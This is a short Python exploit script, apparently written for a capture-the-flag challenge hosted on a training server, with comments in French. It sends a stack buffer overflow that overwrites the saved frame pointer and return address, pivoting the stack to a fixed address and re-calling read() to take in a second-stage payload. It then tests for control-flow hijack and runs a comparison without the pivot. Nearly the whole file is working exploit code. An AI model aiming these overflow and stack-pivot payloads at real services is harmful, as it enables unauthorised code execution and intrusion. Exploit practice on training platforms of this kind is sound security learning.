import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31809
READ_CALL = 0x400b80      # call read(0, rbp-0x20, 0x80)
STAGE = 0x602900


def p64(x):
    return struct.pack("<Q", x)


def attempt(stage2):
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(4)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    stage1 = b"A" * 40 + p64(STAGE) + p64(READ_CALL)
    s.sendall(stage1)
    time.sleep(0.4)
    s.sendall(stage2)
    time.sleep(0.8)
    out = b""
    closed = False
    try:
        while True:
            c = s.recv(4096)
            if not c:
                closed = True
                break
            out += c
    except socket.timeout:
        pass
    except Exception:
        closed = True
    s.close()
    return out, closed


# stage2 = 0x20 filler + rbp + saut vers 0x4141414141414141 (crash si pivot OK)
st2 = b"B" * 0x20 + p64(0) + p64(0x4141414141414141)
out, closed = attempt(st2)
print("test pivot: sortie", len(out), "ferme:", closed)
print("extrait:", repr(out[:300]))

# controle : sans pivot (rbp bidon) -> comportement different
s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(4)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(b"A" * 40 + p64(0xdeadbeef) + p64(0x4141414141414141))
time.sleep(0.8)
out2 = b""
closed2 = False
try:
    while True:
        c = s.recv(4096)
        if not c:
            closed2 = True
            break
        out2 += c
except socket.timeout:
    pass
except Exception:
    closed2 = True
print("controle: sortie", len(out2), "ferme:", closed2)
s.close()
